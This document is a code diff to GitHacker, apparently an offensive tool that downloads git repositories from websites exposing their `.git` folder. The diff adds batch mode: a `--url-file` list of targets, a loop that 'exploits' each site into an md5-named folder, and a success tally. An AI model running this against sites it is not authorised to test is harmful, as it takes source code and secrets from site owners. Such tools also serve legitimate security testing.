@@ -39,8 +39,8 @@ class GitHacker():
         # Ensure the target is a git folder via `.git/HEAD`
         if requests.head("{}{}".format(self.url, ".git/HEAD"), verify=self.verify).status_code != 200:
             logging.error(
-                "The target url is not a valid git repository, `.git/HEAD` not exists")
-            return
+                "The target url({}) is not a valid git repository, `.git/HEAD` not exists".format(self.url))
+            return False
 
         for _ in range(self.thread_number):
             threading.Thread(target=self.worker, daemon=True).start()
@@ -49,6 +49,8 @@ class GitHacker():
             self.sighted()
         else:
             self.blind()
+
+        return True
 
     def directory_listing_enabled(self):
         response = requests.get("{}{}".format(self.url, ".git/"), verify=self.verify)
@@ -306,24 +308,44 @@ def append_if_not_exists(s, suffix):
 
 def main():
     parser = argparse.ArgumentParser(description='GitHacker')
-    parser.add_argument('--url', required=True,
-                        help='url of the target website which expose `.git` folder')
-    parser.add_argument('--folder', required=True,
-                        help='the local folder to store the git repository')
-    parser.add_argument('--brute', required=False, action="store_true",
-                        help='enable brute forcing branch/tag names')
-    parser.add_argument('--threads', required=False, default=0x04,
-                        type=int, help='threads number to download from internet')
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('--url', help='url of the target website which expose `.git` folder')
+    group.add_argument('--url-file', help='url file that contains a list of urls of the target website which expose `.git` folder')
+    parser.add_argument('--output-folder', required=True, help='the local folder which will be the parent folder of all exploited repositories, every repo will be stored in folder named md5(url).')
+    parser.add_argument('--brute', required=False, help='enable brute forcing branch/tag names')
+    parser.add_argument('--threads', required=False, default=0x04, type=int, help='threads number to download from internet')
     parser.add_argument('--version', action='version', version=__version__)
     args = parser.parse_args()
-    GitHacker(
-        url=append_if_not_exists(remove_suffixes(
-            args.url, ['.git', '.git/']), '/'),
-        dst=args.folder,
-        threads=args.threads,
-        brute=args.brute,
-    ).start()
+    urls = []
+    if args.url:
+        urls.append(args.url)
+    elif args.url_file:
+        f = open(args.url_file)
+        for line in f:
+            url = line.strip()
+            if url.strip() != "": urls.append(url)
 
+    succeed_urls = []
+    logging.info("{} urls to be exploited".format(len(urls)))
+    for url in urls:
+        folder = os.path.sep.join([args.output_folder, md5(url)])
+        logging.info("Exploiting {} into {}".format(url, folder))
+        try:
+            result = GitHacker(
+                url=append_if_not_exists(remove_suffixes(url, ['.git', '.git/']), '/'),
+                dst=folder,
+                threads=args.threads,
+                brute=args.brute,
+            ).start()
+            if result:
+                succeed_urls.append(url)
+        except Exception as e:
+            logging.error(repr(e))
+
+    logging.info("{} / {} were exploited successfully".format(len(succeed_urls), len(urls)))
+    for url in succeed_urls:
+        folder = os.path.sep.join([args.output_folder, md5(url)])
+        logging.info("{} -> {}".format(url, folder))
 
 if __name__ == "__main__":
     main()
